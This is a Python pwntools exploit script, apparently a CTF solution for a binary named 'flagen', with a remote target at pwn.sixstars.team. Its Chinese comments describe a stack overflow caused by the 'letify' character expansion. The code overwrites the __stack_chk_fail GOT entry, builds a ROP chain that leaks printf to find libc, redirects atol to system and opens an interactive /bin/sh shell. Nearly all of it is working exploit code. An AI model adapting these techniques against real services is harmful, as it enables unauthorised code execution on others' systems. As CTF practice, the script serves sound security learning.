#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./flagen_flagen"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
#heap_add=0
#stack_add=0

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23640)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def input_flag(flag):
    r.sendlineafter("Your choice: ",'1')
    r.sendline(flag)
    r.recvuntil("Done.\n")
    
def letify():
    r.sendlineafter("Your choice: ",'4')
    #r.recvuntil("Done.\n")

def uppercase():
    r.recvuntil('Your choice: ')
    r.sendline('2')
    r.recvuntil("Done.\n")

def add_prefix():
    r.sendlineafter("Your choice: ",'5')
    r.recvuntil("Done.\n")

def output_flag():
    r.sendlineafter("Your choice: ",'6')
    r.recvuntil("The Flag is: ")
    flag = r.recvline()
    r.recvuntil("Done.\n")
    return flag

'''
漏洞：
 letify中，输入H，会变成3个字符
 可以增加字符串的长度

 dest<- __stack_chk_fail got
# read -> atol jump->choice
'''

check_stack_pos = elf.got['__stack_chk_fail']
print hex(check_stack_pos)
puts  = elf.plt['puts']
printf = elf.plt['printf']

leave_ret = 0x80489C1  
ret = 0x80489C2

pj_strcpy = 0x08048536
pj_malloc = 0x08048546
pj_puts = 0x08048556
pj_libcStart = 0x08048566
pj_write = 0x08048576
pj_atol = 0x08048586
pj_setvbuf = 0x8048596
pj_snprintf = 0x80485A6
pj_errnoL = 0x080485B6

stdin_1 = 0xf7fc15a0      
stdin_2 = 0xf7fc1d60

got_origin=[ret,pj_strcpy,pj_malloc,pj_puts,pj_libcStart,pj_write,pj_atol,pj_setvbuf,pj_snprintf,pj_errnoL, 0x10203040,0x10203040,0x10203040,0x10203040,0x10203040,0x10203040,0x10203040,stdin_1,stdin_2]

main = 0x08048B66
loop_start = 0x8048BA4
call_letify = 0x8048C43
printf_got = elf.got['printf']
# 原来ebp位置可能为参数

pop_ret = 0x080484c5
pop3_ret =  0x08048f39
pop2_ret = 0x08048f3a 
call_inputflag = 0x8048A4C
bss = 0x804b000 + 0x500

call_edx = 0x0804866d
jmp_ptr_eax =0x08049177


read_sth = 0x8048D83
read_choice = 0x8048E99
#payload = ''.join([p32(x) for x in got_origin]) + 'h'*21 + 'a'*(0xfe-len(got_origin)*4-21-20-4) + p32(pop_ret)+ p32(check_stack_pos) + p32(puts) + p32(main) + p32(printf_got) 
payload = ''.join([p32(x) for x in got_origin]) + 'h'*29 + 'a'*(0xfe-len(got_origin)*4-29-20-16-4) + p32(pop_ret)+ p32(check_stack_pos) + p32(puts) + p32(pop_ret) + p32(printf_got)
payload+= p32(read_sth) + p32(read_choice) + p32(elf.got['atol']) + p32(0x10203040)
input_flag(payload)
debug()
letify()

printf_addr = r.recv(4)
printf_addr = u32(printf_addr)
info('printf_addr:  %16x', printf_addr)
libc.address = printf_addr - libc.sym['printf']
info('libc addr:  %16x', libc.address)

system = libc.sym['system']
binsh = list(libc.search("/bin/sh"))[0]

debug()
r.sendline(p32(system))
r.sendline("/bin/sh\x00")


r.interactive()
